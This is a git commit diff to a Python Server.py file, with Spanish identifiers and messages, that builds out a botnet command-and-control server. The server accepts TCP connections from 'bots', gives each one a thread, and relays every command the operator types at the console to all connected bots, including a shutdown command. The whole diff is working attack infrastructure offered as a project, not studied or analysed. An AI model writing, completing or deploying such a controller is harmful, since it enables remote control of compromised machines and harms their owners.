7f8c3179b76a25993c58a05d933ae460d6ec2943
Banano-Cry <markbenitezk@gmail.com>
2020-06-29 22:43:51 -0400

    Server created

--- Server.py
+++ Server.py
@@ -2,8 +2,9 @@ import socket
 import os
 import queue
 import threading
+import time
 threads = []
-contador = 1
+contador = [1]
 principalQueue = queue.Queue()
 class  serverThread(threading.Thread):
     def __init__(self,queueServer):
@@ -17,19 +18,37 @@ class  serverThread(threading.Thread):
                 pass
             elif(consoleSnd == "exit"):
                 for i in range(len(threads)):
-                    self.queueServer.put(consoleSnd)
+                    self.principalQueue.put(consoleSnd)
                     time.sleep(1)
                 os._exit(0)
             else:
                 print('[+] Enviando comando ::{}:: a {} bots'.format(consoleSnd,str(len(threads))))
                 for i in range(len(threads)):
-                    time.sleep(1);
-                    self.queueServer.put(consoleSnd)
+                    time.sleep(0.1);
+                    self.principalQueue.put(consoleSnd)
 
 class botThread(threading.Thread):
     def __init__(self,bot,botAddress,queue):
-        botName = "Bot#"+str(contador)
-        threading.Thread__init__(self,name="")
+        self.botName = "Bot#"+str(contador)
+        threading.Thread.__init__(self,name=self.botName)
+        self.botIP = botAddress[0]
+        self.botPort = botAddress[1]
+        self.bot = bot
+        self.botAddress = botAddress
+        self.principalQueue = queue
+   
+    def run(self):
+        contador[0] = contador[0] + 1;
+        print('[+] Conexion proveniente::{}:{} conectandon con {}'.format(str(self.botIP),str(self.botPort),threading.current_thread().getName()))
+        while True:
+            executeBotCmd = self.principalQueue.get()
+            try:
+                executeBotCmd+= "\n"
+                self.bot.send(executeBotCmd.encode('utf-8'))
+            except Exception as ex:
+                print('Error al ejecutar el comando <{}>'.format(ex))
+                break
+
 
 def handler(port,host,queue):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -41,6 +60,11 @@ def handler(port,host,queue):
 
     cmdServer = serverThread(queue);
     cmdServer.start()
+    while True:
+        (bot,botAddress) = server.accept()
+        newBot = botThread(bot,botAddress,principalQueue)
+        threads.append(newBot)
+        newBot.start()
 
 def main():
     localPort = 8080
